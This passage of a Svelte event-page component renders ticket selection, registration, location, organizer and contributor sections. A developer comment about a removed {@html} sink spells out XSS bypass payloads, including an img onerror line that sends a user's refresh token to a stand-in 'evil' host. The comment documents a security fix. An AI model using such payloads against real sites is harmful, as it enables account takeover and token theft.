				<div class="mt-3 flex items-center gap-4">
					<div class="flex w-[44px] items-center justify-center rounded-md border py-[11px]" style="border-color: {themeColor.toggle};">
						<svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="color: {themeColor.text};"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
					</div>
					<div>
						<div class="text-base font-medium" style="color: {themeColor.text};">{event.locationDetails?.virtual?.platform ?? 'Virtual Link'}</div>
						<div class="text-xs" style="color: {themeColor.lightText};">Online</div>
					</div>
				</div>
				{#if event.locationDetails?.physical}
				<div class="mt-2 flex items-center gap-4">
					<div class="flex w-[44px] items-center justify-center rounded-md border py-[11px]" style="border-color: {themeColor.toggle};">
						<svg width="22" height="22" viewBox="0 0 23 23" fill="none" style="color: {themeColor.text};">
							<path fill-rule="evenodd" clip-rule="evenodd" d="M2.86182 9.81725C2.86182 15.7842 10.0806 21.4847 11.4556 21.4847C12.8306 21.4847 20.0493 15.7842 20.0493 9.81725C20.0493 5.18665 16.2022 1.43262 11.4556 1.43262C6.70895 1.43262 2.86182 5.18522 2.86182 9.81725Z" stroke="currentColor" stroke-width="2.14844" stroke-linecap="round" stroke-linejoin="round"/>
							<path fill-rule="evenodd" clip-rule="evenodd" d="M13.6035 9.31055C13.6035 9.88035 13.3772 10.4268 12.9743 10.8297C12.5713 11.2326 12.0249 11.459 11.4551 11.459C10.8853 11.459 10.3388 11.2326 9.9359 10.8297C9.53299 10.4268 9.30664 9.88035 9.30664 9.31055C9.30664 8.74075 9.53299 8.19428 9.9359 7.79137C10.3388 7.38846 10.8853 7.16211 11.4551 7.16211C12.0249 7.16211 12.5713 7.38846 12.9743 7.79137C13.3772 8.19428 13.6035 8.74075 13.6035 9.31055Z" stroke="currentColor" stroke-width="2.14844" stroke-linecap="round" stroke-linejoin="round"/>
						</svg>
					</div>
					<div>
						<div class="text-base font-medium" style="color: {themeColor.text};">{event.locationDetails.physical.venueName}</div>
						<div class="text-xs" style="color: {themeColor.lightText};">In-person</div>
					</div>
				</div>
				{/if}

				{:else if event.locationDetails?.physical}
				<div class="mt-3 flex items-center gap-4">
					<div class="flex w-[44px] items-center justify-center rounded-md border py-[11px]" style="border-color: {themeColor.toggle};">
						<svg width="22" height="22" viewBox="0 0 23 23" fill="none" style="color: {themeColor.text};">
							<path fill-rule="evenodd" clip-rule="evenodd" d="M2.86182 9.81725C2.86182 15.7842 10.0806 21.4847 11.4556 21.4847C12.8306 21.4847 20.0493 15.7842 20.0493 9.81725C20.0493 5.18665 16.2022 1.43262 11.4556 1.43262C6.70895 1.43262 2.86182 5.18522 2.86182 9.81725Z" stroke="currentColor" stroke-width="2.14844" stroke-linecap="round" stroke-linejoin="round"/>
							<path fill-rule="evenodd" clip-rule="evenodd" d="M13.6035 9.31055C13.6035 9.88035 13.3772 10.4268 12.9743 10.8297C12.5713 11.2326 12.0249 11.459 11.4551 11.459C10.8853 11.459 10.3388 11.2326 9.9359 10.8297C9.53299 10.4268 9.30664 9.88035 9.30664 9.31055C9.30664 8.74075 9.53299 8.19428 9.9359 7.79137C10.3388 7.38846 10.8853 7.16211 11.4551 7.16211C12.0249 7.16211 12.5713 7.38846 12.9743 7.79137C13.3772 8.19428 13.6035 8.74075 13.6035 9.31055Z" stroke="currentColor" stroke-width="2.14844" stroke-linecap="round" stroke-linejoin="round"/>
						</svg>
					</div>
					<div class="text-base font-medium" style="color: {themeColor.text};">{event.locationDetails.physical.venueName}</div>
				</div>

				{:else}
				<div class="mt-3 flex items-center gap-4">
					<div class="flex w-[44px] items-center justify-center rounded-md border py-[11px]" style="border-color: {themeColor.toggle};">
						<svg width="22" height="22" viewBox="0 0 23 23" fill="none" style="color: {themeColor.text};">
							<path fill-rule="evenodd" clip-rule="evenodd" d="M2.86182 9.81725C2.86182 15.7842 10.0806 21.4847 11.4556 21.4847C12.8306 21.4847 20.0493 15.7842 20.0493 9.81725C20.0493 5.18665 16.2022 1.43262 11.4556 1.43262C6.70895 1.43262 2.86182 5.18522 2.86182 9.81725Z" stroke="currentColor" stroke-width="2.14844" stroke-linecap="round" stroke-linejoin="round"/>
							<path fill-rule="evenodd" clip-rule="evenodd" d="M13.6035 9.31055C13.6035 9.88035 13.3772 10.4268 12.9743 10.8297C12.5713 11.2326 12.0249 11.459 11.4551 11.459C10.8853 11.459 10.3388 11.2326 9.9359 10.8297C9.53299 10.4268 9.30664 9.88035 9.30664 9.31055C9.30664 8.74075 9.53299 8.19428 9.9359 7.79137C10.3388 7.38846 10.8853 7.16211 11.4551 7.16211C12.0249 7.16211 12.5713 7.38846 12.9743 7.79137C13.3772 8.19428 13.6035 8.74075 13.6035 9.31055Z" stroke="currentColor" stroke-width="2.14844" stroke-linecap="round" stroke-linejoin="round"/>
						</svg>
					</div>
					<div class="text-base font-medium" style="color: {themeColor.text};">Register to See Address</div>
				</div>
				{/if}
			</div>

			<!-- Registration Section -->
			<div class="mb-5 flex flex-col rounded-2xl border" style="border-color: {themeColor.toggle}; background-color: {themeColor.cover};">
				<h2 class="rounded-t-2xl px-5 py-2 text-lg font-normal" style="background-color: {themeColor.smallCover}; color: {themeColor.text};">
					Registration
				</h2>

				{#if event.eventStatus === 'ENDED' || event.eventStatus === 'CANCELLED' || (event.endDateTime && new Date(event.endDateTime) < new Date())}
				<div class="flex flex-col px-5 py-5">
					<div class="flex items-center gap-3">
						<img src="/reg-closed.svg" alt="" class="h-[42px] w-[42px]" />
						<h3 class="text-xl font-semibold" style="color: {themeColor.text};">
							{event.eventStatus === 'CANCELLED' ? 'Event Cancelled' : 'Event Has Ended'}
						</h3>
					</div>
					<p class="mt-3 text-sm leading-relaxed" style="color: {themeColor.lightText};">
						{event.eventStatus === 'CANCELLED'
							? 'This event has been cancelled by the organizer.'
							: 'This event has ended. Registration is no longer available.'}
					</p>
					<a
						href="mailto:{organizerEmail || 'info@rondwell.com'}"
						class="mt-4 inline-flex items-center justify-center self-start rounded-lg px-16 py-3 text-sm font-medium transition-opacity hover:opacity-90"
						style="background-color: {themeColor.button}; color: {themeColor.buttonText};"
					>
						Contact Organizer
					</a>
				</div>

				{:else if !event.registrationOpen}
				<div class="flex flex-col px-5 py-5">
					<div class="flex items-center gap-3">
						<img src="/reg-closed.svg" alt="" class="h-[42px] w-[42px]" />
						<h3 class="text-xl font-semibold" style="color: {themeColor.text};">Registration Closed</h3>
					</div>
					<p class="mt-3 text-sm leading-relaxed" style="color: {themeColor.lightText};">
						This event is currently not taking registrations. You may contact the host or subscribe to receive updates.
					</p>
					<a
						href="mailto:{organizerEmail || 'info@rondwell.com'}"
						class="mt-4 inline-flex items-center justify-center self-start rounded-lg px-16 py-3 text-sm font-medium transition-opacity hover:opacity-90"
						style="background-color: {themeColor.button}; color: {themeColor.buttonText};"
					>
						Contact Organizer
					</a>
				</div>
				{:else}
				{#if isFreeNoTicketEvent}
				<p class="my-4 px-5 text-base" style="color: {themeColor.text};">
					Welcome! Register below to attend this event.
				</p>
				{:else}
				<p class="my-4 px-5 text-base" style="color: {themeColor.text};">
					Welcome! Please choose your desired ticket type:
				</p>
				{/if}

				<div class="mb-5 flex flex-col gap-3 px-5">
					{#each ticketTypes as ticket (ticket._id)}
					{@const available = isTicketAvailable(ticket)}
					{@const salesEnded = getTicketSalesEndLabel(ticket)}
					{@const remaining = getTicketRemaining(ticket)}
					<button
						class="relative block w-full text-left rounded-lg border-2 p-4 transition-colors {available ? 'cursor-pointer' : 'cursor-not-allowed opacity-60'}"
						style="background-color: {themeColor.bg}; border-color: {selectedTicket === ticket._id ? themeColor.button : themeColor.toggle};"
						on:click={() => { if (available) { selectedTicket = ticket._id; if (!ticketQuantity[ticket._id]) ticketQuantity[ticket._id] = 1; } }}
						disabled={!available}
					>
						<div class="flex items-start justify-between">
							<div class="flex flex-wrap items-center gap-1.5 lg:flex-row lg:items-center">
								<span class="text-sm font-medium" style="color: {themeColor.text};">{ticket.name}</span>
								{#if ticket.requiresApproval}
								<span class="min-w-fit rounded-full px-2 py-0.5 text-xs font-medium" style="background-color: {themeColor.smallCover}; color: {themeColor.lightText};">
									Require Approval
								</span>
								{/if}
								{#if ticket.isEarlyBird}
								<span class="min-w-fit rounded-full px-2 py-0.5 text-xs font-medium" style="background-color: {themeColor.smallCover}; color: {themeColor.button};">
									Early Bird
								</span>
								{/if}
								{#if ticket.tags?.length}
								{#each ticket.tags as tag}
								<span class="min-w-fit rounded-full px-2 py-0.5 text-xs font-medium" style="background-color: {themeColor.smallCover}; color: {themeColor.lightText};">
									{tag}
								</span>
								{/each}
								{/if}
								{#if remaining !== null && remaining > 0 && available}
								<!-- FE-P3-02: "Only N left" inventory hint. -->
								<span class="min-w-fit rounded-full px-2 py-0.5 text-xs font-medium" style="background-color: #FEF3C7; color: #B45309;">
									Only {remaining} left
								</span>
								{:else if remaining === 0}
								<span class="min-w-fit rounded-full px-2 py-0.5 text-xs font-medium" style="background-color: #FEE2E2; color: #B91C1C;">
									Sold out
								</span>
								{/if}
							</div>
							<span class="text-sm font-medium" style="color: {themeColor.lightText};">{formatTicketPrice(ticket)}</span>
						</div>
						{#if ticket.description}
						<div class="ticket-desc mt-2 text-xs leading-relaxed" style="color: {themeColor.lightText};">{@html sanitizeHtml(ticket.description)}</div>
						{/if}
						{#if salesEnded}
						<p class="mt-2 text-xs" style="color: {themeColor.lightText};">{salesEnded}</p>
						{/if}

						<!-- Group Registration Quantity Selector -->
						{#if isGroupEnabled && available && selectedTicket === ticket._id}
						<div class="mt-3 flex items-center justify-between rounded-lg px-3 py-2" style="background-color: {themeColor.smallCover};"
							on:click|stopPropagation={() => {}}>
							<span class="text-xs font-medium" style="color: {themeColor.lightText};">Quantity</span>
							<div class="flex items-center gap-2">
								<button
									class="flex h-7 w-7 items-center justify-center rounded-full transition-colors"
									style="background-color: {themeColor.toggle}; color: {themeColor.text};"
									on:click|stopPropagation={() => {
										const current = ticketQuantity[ticket._id] ?? 1;
										if (current > 1) { ticketQuantity[ticket._id] = current - 1; ticketQuantity = ticketQuantity; }
									}}
									disabled={(ticketQuantity[ticket._id] ?? 1) <= 1}
									aria-label="Decrease quantity"
								>
									<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M5 12h14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
								</button>
								<span class="min-w-[24px] text-center text-sm font-semibold" style="color: {themeColor.text};">
									{ticketQuantity[ticket._id] ?? 1}
								</span>
								<button
									class="flex h-7 w-7 items-center justify-center rounded-full transition-colors"
									style="background-color: {themeColor.button}; color: {themeColor.buttonText};"
									on:click|stopPropagation={() => {
										const current = ticketQuantity[ticket._id] ?? 1;
										const max = Math.min(maxGroupSize, ticket.quantityAvailable ?? maxGroupSize);
										if (current < max) { ticketQuantity[ticket._id] = current + 1; ticketQuantity = ticketQuantity; }
									}}
									disabled={(ticketQuantity[ticket._id] ?? 1) >= Math.min(maxGroupSize, ticket.quantityAvailable ?? maxGroupSize)}
									aria-label="Increase quantity"
								>
									<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 5v14M5 12h14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
								</button>
							</div>
						</div>
						{/if}
					</button>
					{/each}

					{#if ticketTypes.length === 0 && !isFreeNoTicketEvent}
					<p class="text-sm" style="color: {themeColor.lightText};">No tickets available yet.</p>
				{/if}
				</div>

				<!-- Sign-in prompt -->
				{#if !$isAuthenticated}
				<a
					href="/auth?redirect=/event-page/{eventId}"
					class="mx-5 mb-4 flex items-center gap-3 rounded-lg px-4 py-3 no-underline transition-colors hover:opacity-80"
					style="background-color: {themeColor.smallCover};"
				>
					<div class="flex size-6 items-center justify-center rounded-full" style="background-color: {themeColor.toggle};">
						<svg width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zM20.59 22c0-3.87-3.85-7-8.59-7s-8.59 3.13-8.59 7" stroke="{themeColor.lightText}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
					</div>
					<span class="text-sm" style="color: {themeColor.lightText};">
						<span class="mr-1 font-bold" style="color: {themeColor.text};">SIGN-IN</span> For one-click registration
					</span>
				</a>
				{/if}

				<!-- Register Button -->
				<div class="px-5 pb-5">
					<button
						class="w-full cursor-pointer rounded-lg px-4 py-2.5 text-base font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
						style="background-color: {themeColor.button}; color: {themeColor.buttonText};"
						on:click={() => (showAddModal = true)}
						disabled={!isFreeNoTicketEvent && (!selectedTicket || ticketTypes.length === 0 || !anyTicketAvailable || !selectedTicketAvailable)}
					>
						{#if !anyTicketAvailable && !isFreeNoTicketEvent}
							Tickets Unavailable
						{:else if isFreeNoTicketEvent}
							Register
						{:else}
							{getRegisterButtonLabel()}
						{/if}
					</button>
					<RegistrationModal
						bind:open={showAddModal}
						eventData={event}
						selectedTicketId={selectedTicket}
						{ticketTypes}
						{registrationFields}
						ticketQuantity={ticketQuantity[selectedTicket] ?? 1}
						isGroupRegistration={isGroupEnabled && (ticketQuantity[selectedTicket] ?? 1) > 1}
						{features}
					/>
				</div>
				{/if}
			</div>

			<!-- About Event -->
			{#if event.description}
			<div class="mb-5 max-w-2xl rounded-2xl" style="background-color: {themeColor.cover};">
				<div class="mb-4 flex items-center gap-2 border-b p-5" style="border-color: {themeColor.toggle};">
					<svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" style="color: {themeColor.lightText};">
						<path d="M10.8446 19H6.11242C1.82978 19 0 16.9498 0 12.1512V6.84884C0 2.05023 1.82978 0 6.11242 0H10.0559C10.3793 0 10.6474 0.300465 10.6474 0.662791C10.6474 1.02512 10.3793 1.32558 10.0559 1.32558H6.11242C2.47652 1.32558 1.18305 2.77488 1.18305 6.84884V12.1512C1.18305 16.2251 2.47652 17.6744 6.11242 17.6744H10.8446C14.4805 17.6744 15.774 16.2251 15.774 12.1512V7.73256C15.774 7.37023 16.0421 7.06977 16.3655 7.06977C16.6889 7.06977 16.957 7.37023 16.957 7.73256V12.1512C16.957 16.9498 15.1272 19 10.8446 19Z" fill="currentColor"/>
						<path d="M16.364 8.39502H13.2092C10.5119 8.39502 9.46289 7.21967 9.46289 4.19735V0.662463C9.46289 0.397346 9.60486 0.149905 9.82569 0.0526953C10.0465 -0.0533512 10.2989 0.00850933 10.4724 0.194091L16.782 7.26386C16.9476 7.44944 17.0029 7.74107 16.9082 7.98851C16.8136 8.23595 16.6006 8.39502 16.364 8.39502ZM10.6459 2.262V4.19735C10.6459 6.47735 11.1744 7.06944 13.2092 7.06944H14.9365L10.6459 2.262Z" fill="currentColor"/>
					</svg>
					<h2 class="text-lg font-medium" style="color: {themeColor.text};">About Event</h2>
				</div>
				<div class="event-description px-5 pb-5 prose prose-sm max-w-none" style="color: {themeColor.lightText};">
					{@html sanitizeHtml(event.description)}
				</div>
			</div>
			{/if}

			<!--
				GAP 6 — public contributor wall.

				Names (or "Anonymous") and notes only. Per-person amounts are never
				sent by the API and must never be shown: publishing who gave how
				much is a social harm, and the aggregate is all the page needs.
			-->
			{#if features?.guestContributions?.enabled && features.guestContributions.showOnPublicPage && contributorSummary.contributorCount > 0}
			<div class="mb-5 max-w-2xl rounded-2xl" style="background-color: {themeColor.cover};">
				<div class="flex items-center justify-between gap-2 border-b p-5" style="border-color: {themeColor.toggle};">
					<h2 class="flex items-center gap-2 text-lg font-medium" style="color: {themeColor.text};">
						🎁 Gifts &amp; contributions
					</h2>
					<span class="text-sm" style="color: {themeColor.lightText};">
						{contributorSummary.contributorCount} {contributorSummary.contributorCount === 1 ? 'person' : 'people'}
					</span>
				</div>
				<div class="flex flex-col gap-3 px-5 pb-5 pt-4">
					{#each contributorWall as c}
						<div class="flex items-start gap-3">
							<div
								class="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full text-xs font-semibold"
								style="background-color: {themeColor.smallCover}; color: {themeColor.text};"
							>
								{(c.name || '?').charAt(0).toUpperCase()}
							</div>
							<div class="min-w-0">
								<p class="text-sm font-medium" style="color: {themeColor.text};">{c.name}</p>
								{#if c.message}
									<p class="mt-0.5 text-sm break-words" style="color: {themeColor.lightText};">{c.message}</p>
								{/if}
							</div>
						</div>
					{/each}
				</div>
			</div>
			{/if}

			<!-- Social Links (between About and Location, per reference design) -->
			{#if event.socialLinks && Object.values(event.socialLinks).some(Boolean)}
			<div class="mb-5 flex flex-wrap items-center gap-3 px-1">
				{#if event.socialLinks.instagram}
				<a href="https://instagram.com/{event.socialLinks.instagram}" target="_blank" rel="noopener" aria-label="Instagram" class="opacity-50 hover:opacity-100 transition-opacity">
					<svg width="20" height="20" viewBox="0 0 18 18" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 8.64C0 5.616 0 4.104.588 2.948A4.5 4.5 0 012.949.589C4.104 0 5.614 0 8.64 0h.72c3.024 0 4.536 0 5.693.588a4.5 4.5 0 012.359 2.36C18 4.104 18 5.614 18 8.64v.72c0 3.024 0 4.536-.588 5.693a4.5 4.5 0 01-2.36 2.359C13.896 18 12.386 18 9.36 18h-.72c-3.024 0-4.536 0-5.693-.588A4.5 4.5 0 01.589 15.052C0 13.896 0 12.386 0 9.36V8.64z" fill="{themeColor.lightText}"/><path fill-rule="evenodd" clip-rule="evenodd" d="M9 13.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zm0-1.8a2.7 2.7 0 100-5.4 2.7 2.7 0 000 5.4z" fill="{themeColor.cover}"/><circle cx="13.7" cy="4.27" r="1.35" fill="{themeColor.cover}"/></svg>
				</a>
				{/if}
				{#if event.socialLinks.x}
				<a href="https://x.com/{event.socialLinks.x}" target="_blank" rel="noopener" aria-label="X / Twitter" class="opacity-50 hover:opacity-100 transition-opacity">
					<svg width="18" height="18" viewBox="0 0 17 17" fill="none"><path d="M17 17L10.352 7.092l.012.01L16.357 0h-2.003l-4.883 5.78L5.594 0H.34l6.207 9.25L0 17h2.003l5.429-6.43L11.747 17H17zM4.8 1.546l9.328 13.908H12.54L3.205 1.546H4.8z" fill="{themeColor.lightText}"/></svg>
				</a>
				{/if}
				{#if event.socialLinks.youtube}
				<a href="https://youtube.com/{event.socialLinks.youtube}" target="_blank" rel="noopener" aria-label="YouTube" class="opacity-50 hover:opacity-100 transition-opacity">
					<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" stroke="{themeColor.lightText}" stroke-width="1.5"/><path d="M9.5 8.5l6 3.5-6 3.5v-7z" fill="{themeColor.lightText}"/></svg>
				</a>
				{/if}
				{#if event.socialLinks.tiktok}
				<a href="https://tiktok.com/@{event.socialLinks.tiktok}" target="_blank" rel="noopener" aria-label="TikTok" class="opacity-50 hover:opacity-100 transition-opacity">
					<svg width="18" height="20" viewBox="0 0 14 16" fill="none"><path d="M10.08 0h1.44c.16 1.28.96 2.4 2.16 2.88v2.24c-1.12-.08-2.16-.48-3.04-1.12v4.96c0 2.48-2 4.48-4.48 4.48A4.48 4.48 0 011.68 11.2a4.48 4.48 0 014.48-4.48v2.4a2.08 2.08 0 00-2.08 2.08 2.08 2.08 0 002.08 2.08c1.12 0 2.08-.96 2.08-2.08V0h1.84z" fill="{themeColor.lightText}"/></svg>
				</a>
				{/if}
				{#if event.socialLinks.linkedin}
				<a href="https://linkedin.com/in/{event.socialLinks.linkedin}" target="_blank" rel="noopener" aria-label="LinkedIn" class="opacity-50 hover:opacity-100 transition-opacity">
					<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-4 0v7h-4v-7a6 6 0 016-6zM2 9h4v12H2zM4 6a2 2 0 100-4 2 2 0 000 4z" stroke="{themeColor.lightText}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
				</a>
				{/if}
				{#if event.socialLinks.website}
				<a href={event.socialLinks.website.startsWith('http') ? event.socialLinks.website : `https://${event.socialLinks.website}`} target="_blank" rel="noopener" aria-label="Website" class="opacity-50 hover:opacity-100 transition-opacity">
					<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="{themeColor.lightText}" stroke-width="1.5"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z" stroke="{themeColor.lightText}" stroke-width="1.5"/></svg>
				</a>
				{/if}
			</div>
			{/if}

			<!-- Location (Physical or Hybrid events) -->
			{#if (event.eventType === 'PHYSICAL' || event.eventType === 'HYBRID') && event.locationDetails?.physical}
			{@const mapUrl = getMapEmbedUrl(event)}
			<div class="mb-5 max-w-2xl rounded-2xl pb-5" style="background-color: {themeColor.cover};">
				<h2 class="mb-3 border-b px-5 py-3 text-lg font-medium" style="color: {themeColor.text}; border-color: {themeColor.toggle};">Location</h2>
				<div class="px-5">
					<h3 class="mb-1 text-base font-medium" style="color: {themeColor.text};">{event.locationDetails.physical.venueName}</h3>
					<p class="text-sm font-normal" style="color: {themeColor.lightText};">
						{getLocationAddress(event)}
					</p>
				</div>
				{#if mapUrl}
				<div class="mt-3 h-48 w-full px-5">
					<iframe
						title="map location"
						src={mapUrl}
						width="100%"
						height="100%"
						style="border:0; border-radius: 12px;"
						allowfullscreen={true}
						loading="lazy"
						referrerpolicy="no-referrer-when-downgrade"
					></iframe>
				</div>
				{/if}
			</div>
			{/if}

			<!-- Mobile: Organized By -->
			<div class="md:hidden">
				{#if collectionInfo}
				<div class="mb-4 rounded-2xl p-4" style="background-color: {themeColor.cover};">
					<div class="flex items-center justify-between gap-3">
						<div class="flex gap-3">
							<img src={collectionInfo.profilePictureUrl || '/tech-icon.svg'} alt="" class="size-9 rounded-[9px] object-cover" style="background-color: {themeColor.smallCover};" on:error={(e) => { (e.currentTarget as HTMLImageElement).src = '/tech-icon.svg'; }} />
							<div>
								<p class="text-xs" style="color: {themeColor.lightText};">Presented by</p>
								<a href={collectionInfo.slug ? `/c/${collectionInfo.slug}` : `/collection/${collectionInfo._id}/events`} class="flex items-center gap-1 text-sm font-medium no-underline hover:underline" style="color: {themeColor.text};">
									{collectionInfo.name}
									<svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M3 1l3 3-3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
								</a>
							</div>
						</div>
						<button
							class="rounded-full px-3.5 py-2 text-sm font-normal transition-colors disabled:opacity-60"
							style="background-color: {themeColor.smallCover}; color: {themeColor.text};"
							disabled={eventSubscribing}
							on:click={handleEventSubscribeClick}
						>
							{eventSubscribing ? '...' : 'Subscribe'}
						</button>
					</div>
					{#if event.description}
					<p class="mt-3 line-clamp-3 text-sm font-light leading-6" style="color: {themeColor.lightText};">
						<!--
							C-14 — `{@html}` REMOVED. This was
							`{@html event.description.replace(/<[^>]*>/g, '').slice(0, 150)}`.

							A regex tag-strip is not a sanitiser, and re-parsing its output
							with `{@html}` defeats whatever it did do. Two one-line bypasses:

							  nested tag        `<<a>img src=x onerror=…>`
							                    the regex eats `<a>`, leaving a live `<img>`

							  unterminated tag  `<img src=x onerror=fetch('//evil/'+localStorage.auth_refresh_token)`
							                    no `>` anywhere, so the regex matches nothing
							                    and the parser auto-closes it on insertion

							This sink is inside the *Presented by* card, so it fires on any
							event belonging to a collection. The `.replace()` read as though
							the value were already sanitised, which is why it survived a
							review that fixed the other sink on this page.

							This only ever wanted plain text — so let Svelte escape it. The
							regex stays as a display nicety (strip markup from the preview),
							not as a security control.
						-->
						{stripTagsForPreview(event.description)}
					</p>
					{/if}
				</div>
				{/if}

				<div class="rounded-[16px] p-4" style="background-color: {themeColor.cover};">
					<h3 class="mb-4 border-b pb-2 text-sm font-normal" style="color: {themeColor.lightText}; border-color: {themeColor.toggle};">
						Organized By
					</h3>
					<div class="space-y-3">
						<OrganiserList
							organizerName={event.eventOrganizerName ?? 'Organizer'}
							organizerAvatar={organizerProfile?.profilePictureUrl || '/john-avatar.svg'}
							organizerSocial={!!organizerProfile?.socialLinks && Object.values(organizerProfile.socialLinks).some(Boolean)}
							socialLinks={organizerProfile?.socialLinks ?? {}}
							iconColor={themeColor.text}
							iconBgColor={themeColor.cover}
						/>
						{#each organizers.filter((a) => a.displayName || a.email) as admin}
							<OrganiserList
								organizerName={admin.displayName ?? admin.email ?? 'Co-organizer'}
								organizerAvatar="/user1-icon.svg"
								organizerSocial={false}
								iconColor={themeColor.text}
								iconBgColor={themeColor.cover}
							/>
						{/each}
					</div>
					{#if showAttendingSection}
					<div class="mt-6">
						<h3 class="mb-4 border-b pb-2 text-sm font-normal" style="color: {themeColor.lightText}; border-color: {themeColor.toggle};">
							{#if showAttendeeCount}{attendeeCount} Attending{:else}Attending{/if}
						</h3>
						{#if showAttendeeCount && attendeeCount === 0}
						<p class="text-sm" style="color: {themeColor.lightText};">Be the first to register</p>
						{:else if showAttendeeNames}
						<p class="max-w-[334px] text-sm" style="color: {themeColor.lightText};">
							{attendingNames}{#if showAttendeeCount && remainingCount > 0} and {remainingCount} others{/if}
						</p>
						{/if}
					</div>
					{/if}
					<div class="mt-6 flex flex-col space-y-2 mb-4">
						<a href="mailto:{organizerEmail || 'info@rondwell.com'}" class="text-sm" style="color: {themeColor.lightText};">Contact the Organizer</a>
						<a href="mailto:info@rondwell.com?subject=Report Event: {event.title}" class="text-sm" style="color: {themeColor.lightText};">Report Event</a>
					</div>
					{#if event.category}
					<div class="mb-3 w-fit rounded-full border px-3 py-1.5 text-sm" style="border-color: {themeColor.toggle}; color: {themeColor.lightText};">
						<span class="mr-1">#</span>{event.category}
					</div>
					{/if}
					{#if event.tags?.length}
					<div class="flex flex-wrap gap-2">
						{#each event.tags as tag}
						<div class="w-fit rounded-full border px-2 py-1 text-xs" style="border-color: {themeColor.toggle}; color: {themeColor.lightText};">
							<span class="mr-1">#</span>{tag}
						</div>
						{/each}
					</div>
					{/if}
				</div>
			</div>
		</div>
	</div>
</div>
{/if}

{#if collectionInfo}
<SubscribeModal
	bind:open={showSubscribeModal}
	collectionId={collectionInfo._id}
	collectionName={collectionInfo.name}
	{themeColor}
	onSubscribed={() => {}}
/>
{/if}

<style>
	/* Skeleton shimmer animation */
	.skeleton-shimmer {
		background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
		background-size: 200% 100%;
		animation: shimmer 1.8s ease-in-out infinite;
		border-radius: inherit;
	}

	@keyframes shimmer {
		0% { background-position: 200% 0; }
		100% { background-position: -200% 0; }
	}

	/* Loading dots */
	.loading-dots .dot {
		display: block;
		width: 8px;
		height: 8px;
		border-radius: 50%;
		animation: pulse-dot 1.6s ease-in-out infinite;
	}

	.loading-dots .dot-1 {
		background: #DB3EC6;
		animation-delay: 0s;
	}

	.loading-dots .dot-2 {
		background: #8B3AD4;
		animation-delay: 0.2s;
	}

	.loading-dots .dot-3 {
		background: #513BE2;
		animation-delay: 0.4s;
	}

	@keyframes pulse-dot {
		0%, 100% { opacity: 0.3; transform: scale(1); }
		50% { opacity: 1; transform: scale(1.4); }
	}

	:global(.ticket-desc ol) {
		list-style-type: decimal;
		padding-left: 1.25rem;
		margin: 0.25rem 0;
	}
	:global(.ticket-desc ul) {
		list-style-type: disc;
		padding-left: 1.25rem;
		margin: 0.25rem 0;
	}
	:global(.ticket-desc li) {
		margin-bottom: 0.15rem;
	}
	:global(.ticket-desc p) {
		margin: 0.15rem 0;
		font-weight: 400;
	}
	:global(.ticket-desc strong) {
		font-weight: 600;
	}
	:global(.ticket-desc em) {
		font-style: italic;
	}
	:global(.ticket-desc a) {
		text-decoration: underline;
	}

	/* Event description rich text styling */
	:global(.event-description p) {
		margin-bottom: 0.5rem;
		font-weight: 400;
		line-height: 1.6;
	}
	:global(.event-description h1) {
		font-size: 1.4rem;
		font-weight: 700;
		margin-bottom: 0.5rem;
	}
	:global(.event-description h2) {
		font-size: 1.15rem;
		font-weight: 600;
		margin-bottom: 0.4rem;
	}
	:global(.event-description h3) {
		font-size: 1rem;
		font-weight: 600;
		margin-bottom: 0.375rem;
	}
	:global(.event-description ul) {
		list-style-type: disc;
		padding-left: 1.25rem;
		margin-bottom: 0.5rem;
		font-weight: 400;
	}
	:global(.event-description ol) {
		list-style-type: decimal;
		padding-left: 1.25rem;
		margin-bottom: 0.5rem;
		font-weight: 400;
	}
	:global(.event-description li) {
		margin-bottom: 0.25rem;
		font-weight: 400;
	}
	:global(.event-description strong) {
		font-weight: 700;
	}
	:global(.event-description em) {
		font-style: italic;
	}
	:global(.event-description a) {
		color: #7c3aed;
		text-decoration: underline;
	}
	:global(.event-description img) {
		max-width: 100%;
		height: auto;
		border-radius: 0.75rem;
		margin: 0.75rem 0;
		display: block;
	}
	:global(.event-description h4) {
		font-size: 0.95rem;
		font-weight: 600;
		margin-bottom: 0.35rem;
	}
	:global(.event-description blockquote) {
		border-left: 3px solid currentColor;
		padding-left: 0.875rem;
		margin: 0.5rem 0;
		opacity: 0.85;
		font-style: italic;
	}
	:global(.event-description pre) {
		background: rgba(0, 0, 0, 0.06);
		padding: 0.75rem 1rem;
		border-radius: 0.5rem;
		overflow-x: auto;
		margin-bottom: 0.5rem;
		font-size: 0.85em;
	}
	:global(.event-description code) {
		background: rgba(0, 0, 0, 0.06);
		padding: 0.1rem 0.35rem;
		border-radius: 0.25rem;
		font-size: 0.9em;
	}
	:global(.event-description pre code) {
